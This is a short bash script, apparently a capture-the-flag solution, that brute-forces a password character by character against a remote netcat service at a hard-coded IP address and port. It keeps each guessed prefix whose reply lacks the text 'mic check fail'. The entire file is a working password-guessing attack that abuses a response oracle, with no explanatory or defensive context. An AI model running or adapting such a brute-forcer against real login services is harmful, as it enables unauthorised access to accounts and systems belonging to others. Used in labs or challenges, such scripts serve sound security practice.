#!/bin/bash

# Netcat target
host="34.69.226.63"
port="31461"

# Character set to test
charset=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z" "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z" "0" "1" "2" "3" "4" "5" "6" "7" "8" "9")

# Initialize an empty password
password=""

# Function to test a password
test_password() {
    response=$(echo -n "$1" | nc $host $port)
    echo "$response"
}

# Loop until we find the correct password
while true; do
    for char in "${charset[@]}"; do
        attempt="$password$char"
        echo "Trying: $attempt"
        response=$(test_password "$attempt")

        if [[ "$response" != *"mic check fail"* ]]; then
            # If response is different, we have found a correct character
            password="$attempt"
            echo "Found correct character: $char"
            break
        fi
    done
    echo "Current password: $password"
done
